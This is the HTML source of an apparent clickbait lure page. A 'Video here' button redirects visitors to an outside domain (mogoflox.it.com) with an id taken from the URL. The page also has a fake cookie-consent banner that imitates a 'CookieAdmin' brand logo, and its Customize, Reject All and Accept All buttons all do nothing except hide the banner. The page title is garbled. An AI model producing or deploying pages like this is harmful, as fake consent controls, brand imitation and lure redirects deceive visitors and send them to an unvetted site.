<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ôº≠ÔΩèÔΩáÔΩèÔΩÜÔΩåÔΩèÔΩò</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            background-color: #f4f4f4; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: flex-start; 
            padding-top: 220px; 
            height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        /* Tombol Utama */
        .btn-main {
            background-color: #000000;
            color: #ffffff;
            padding: 12px 30px;
            border-radius: 12px;
            text-decoration: none;
            font-weight: 700;
            font-size: 20px;
            display: flex;
            align-items: center;
            gap: 5px;
            border: none;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
            position: relative;
            z-index: 999;
        }

        /* Cookie Modal */
        .cookie-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.05);
            display: flex;
            justify-content: center;
            align-items: flex-end;
            padding-bottom: 25px;
            z-index: 100;
            pointer-events: none;
        }

        .cookie-card {
            background: #ffffff;
            width: 92%;
            max-width: 380px;
            padding: 24px;
            border-radius: 12px;
            box-shadow: 0 0 20px rgba(0,0,0,0.1);
            pointer-events: auto;
        }

        .cookie-card h2 { font-size: 18px; margin: 0 0 15px 0; color: #000; font-weight: 700; }
        .cookie-card p { font-size: 14px; color: #333; line-height: 1.4; margin-bottom: 20px; }

        .btn-group { display: flex; flex-direction: column; gap: 8px; }
        .c-btn {
            width: 100%;
            padding: 10px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            border: 1px solid #ddd;
            background: #fff;
            color: #333;
        }
        .c-btn-blue { background: #1a73e8; color: #fff; border: none; }

        .footer-brand {
            margin-top: 15px;
            font-size: 11px;
            color: #777;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 4px;
        }

        .cookie-logo-box {
            display: flex;
            align-items: center;
            font-weight: 700;
            color: #333;
        }

        /* Logo Perisai Kustom SVG */
        .custom-logo {
            width: 16px;
            height: 16px;
            margin-right: 4px;
            display: flex;
            align-items: center;
        }

        .brand-cookie { color: #202c3d; }
        .brand-admin { color: #a17038; }
    </style>
</head>
<body>

    <button class="btn-main" onclick="startLoading()">
        üîóüëâVideo hereüîó
    </button>

    <div id="cookieBox" class="cookie-overlay">
        <div class="cookie-card">
            <h2>We respect your privacy</h2>
            <p>
                Cookies help us improve your experience, deliver personalized content, and analyze traffic. 
                You can choose which cookies to allow by clicking Customize. Click Accept All to consent or 
                Reject All to decline non-essential cookies.
            </p>
            
            <div class="btn-group">
                <button class="c-btn" onclick="hideCookie()">Customize</button>
                <button class="c-btn" onclick="hideCookie()">Reject All</button>
                <button class="c-btn c-btn-blue" onclick="hideCookie()">Accept All</button>
            </div>

            <div class="footer-brand">
                Powered by 
                <span class="cookie-logo-box">
                    <div class="custom-logo">
                        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <!-- Sisi Kiri Perisai (Biru Tua) -->
                            <path d="M12 2L4 5v6.09c0 5.05 3.41 9.76 8 10.91V2z" fill="#202c3d"/>
                            <!-- Sisi Kanan Perisai (Oranye) -->
                            <path d="M12 2v19.91c4.59-1.15 8-5.86 8-10.91V5l-8-3z" fill="#f4a136"/>
                            <!-- Lingkaran Tengah/Detail (Opsional untuk kemiripan maksimal) -->
                            <circle cx="12" cy="11" r="3" fill="#ffffff" fill-opacity="0.2"/>
                        </svg>
                    </div>
                    <span class="brand-cookie">Cookie</span><span class="brand-admin">Admin</span>
                </span>
            </div>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const videoId = urlParams.get('id') || 'default';

        const daftarDomain = [
            "https://mogoflox.it.com/",
        ];

        const domainTerpilih = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
        const finalLink = domainTerpilih + videoId;

        function startLoading() {
            window.location.href = finalLink;
        }

        function hideCookie() {
            document.getElementById('cookieBox').style.display = 'none';
        }
    </script>
</body>
</html>
